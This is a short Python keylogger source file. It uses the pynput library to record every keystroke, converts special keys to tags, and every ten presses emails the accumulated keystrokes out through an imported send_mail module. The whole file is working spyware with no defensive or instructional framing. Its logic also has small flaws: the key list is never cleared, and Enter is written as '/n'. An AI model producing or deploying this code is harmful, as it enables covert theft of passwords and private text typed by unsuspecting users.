from pynput.keyboard import Key, Listener
from send_mail import *

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))       #Appending the keys as a string into the empty list
    print(f"{key} pressed")
    count+= 1 
    if(count >= 10):
        count = 0
        email(keys)
     
def email(keys):
    message = "" 
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":            #If spacebar is pressed then put a space
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key =="Key.enter":           #If new line is added when Enter Key is pressed
            k = "/n"

        elif key.find("Key") > 0:       
            k = ""
        message += k
    print(message)
    send_mail.sendEmail(message)


def on_release(key):
    if(key == Key.esc):                 #The program quits when esc key is pressed
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    